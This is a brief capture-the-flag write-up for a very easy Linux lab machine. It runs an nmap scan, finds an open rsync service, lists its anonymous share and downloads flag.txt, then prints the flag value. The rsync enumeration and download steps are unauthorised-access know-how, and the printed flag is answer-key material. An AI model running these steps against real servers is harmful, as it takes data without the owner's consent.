System: Linux
Difficulty: Very Easy

IP Address: 10.129.228.37

# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.228.37 -sC -sV -p- -v
```

One port has been returned.
```
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

RSYNC is a file transferring protocol.
Try to query this port to find the available shares that can be downloaded.
```
kali@kali:~$ rsync -avz rsync://10.129.228.37:873
public         	Anonymous Share
```

2 Shares has been found.
The contents of the public share will be downloaded to the attacker machine.
```
kali@kali:~$ rsync -avz rsync://10.129.228.37:873/public ~
receiving incremental file list
./
flag.txt
```

The flag file has been successfully downloaded.
The contents of the flag are below.
```
72eaf5344ebb84908ae543a719830519
```


